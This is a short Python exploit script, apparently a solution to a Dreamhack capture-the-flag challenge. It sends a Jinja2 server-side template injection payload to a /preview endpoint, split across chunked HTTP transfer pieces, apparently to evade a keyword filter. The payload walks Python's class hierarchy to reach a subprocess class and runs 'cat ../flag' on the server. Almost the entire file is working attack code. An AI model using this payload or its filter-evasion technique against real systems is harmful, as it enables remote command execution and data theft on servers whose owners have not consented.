import socket

host = "host3.dreamhack.games"
port = 13136

chunks = [
    "{", "{", " ''.",
    "_", "_",
    "cl", "ass",
    "_", "_",
    ".",
    "_", "_",
    "m", "ro",
    "_", "_",
    "[1].",
    "_", "_",
    "sub", "cl", "asses",
    "_", "_",
    "() ",
    "[269]('cat ../fl",
    "ag',shell=True,stdout=-1).communicate()",
    "}", "}",
]

body = b""

for chunk in chunks:
    data = chunk.encode()
    body += f"{len(data):X}\r\n".encode()
    body += data + b"\r\n"

body += b"0\r\n\r\n"

request = (
    f"POST /preview HTTP/1.1\r\n"
    f"Host: {host}:{port}\r\n"
    "Content-Type: text/plain\r\n"
    "Transfer-Encoding: chunked\r\n"
    "Connection: close\r\n"
    "\r\n"
).encode() + body

with socket.create_connection((host, port), timeout=10) as sock:
    sock.sendall(request)

    response = b""
    while True:
        data = sock.recv(4096)
        if not data:
            break
        response += data

print(response.decode(errors="replace"))
